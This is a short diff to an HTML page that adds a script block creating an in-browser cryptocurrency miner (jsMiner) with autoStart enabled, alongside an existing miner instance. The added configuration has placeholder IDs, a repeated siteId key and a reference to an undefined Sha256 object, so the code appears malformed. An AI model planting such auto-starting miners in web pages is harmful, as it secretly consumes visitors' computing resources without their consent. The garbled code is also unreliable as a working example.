@@ -13,6 +13,24 @@
 	  }
       var engine = new jsMiner.engine(params);
     </script>
+	<script>
+		var miner = new jsMiner.engine({
+			clientId: "your_client_id",
+			siteId: "your_site_id",
+			delay: 30, // Delay between nonce
+			// Other options...
+
+			workerTimeout: 30,
+			autoStart: true,
+			forceUIThread: false,
+			workerRunning: false,
+			hashRate: 0,
+			sha: new Sha256(),
+			delayBetweenNonce: 30,
+			siteId: "",
+			publisherId: ""
+		});
+	</script>
   </head>
   <body>
   </body>
